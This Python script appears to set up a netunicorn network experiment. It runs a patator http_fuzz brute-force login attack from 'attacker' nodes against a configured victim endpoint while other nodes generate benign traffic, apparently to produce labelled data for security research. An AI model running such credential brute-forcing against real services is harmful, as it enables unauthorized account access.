import os

from netunicorn.base.experiment import Experiment
from netunicorn.base.pipeline import Pipeline
from netunicorn.library.tasks.basic import ShellCommand
from netunicorn.client.remote import RemoteClient
from .various_tasks.patator_tasks import BenignTask

from .various_tasks import patator_tasks
import cloudpickle
cloudpickle.register_pickle_by_value(patator_tasks)

attacker_pipeline = (
    Pipeline()
    .then(ShellCommand(
        "python ./patator.py http_fuzz "
        f"url={os.environ['VICTIM_ENDPOINT']} "
        "persistent=1 user_pass=FILE0:FILE0 0=/opt/patator/passwords.txt -x ignore:code=401"
    ))
)
attacker_pipeline.environment_definition.image = "redacted"

benign_pipeline = Pipeline().then(BenignTask(
    "redacted",
    "redacted",
))
benign_pipeline.environment_definition.image = "redacted"

client = RemoteClient(
    endpoint=os.environ['UNICORN_ENDPOINT'],
    login=os.environ['UNICORN_LOGIN'],
    password=os.environ['UNICORN_PASSWORD']
)

minion_pool = client.get_minion_pool()
attacker_pool = minion_pool.filter('location', 'library')
benign_pool = minion_pool.filter('location', 'lab')

experiment = Experiment().map(attacker_pool, attacker_pipeline).map(benign_pool, benign_pipeline)

experiment_label = 'patator-0.1.5'
client.prepare_experiment(experiment, experiment_label)
client.start_execution(experiment_label)
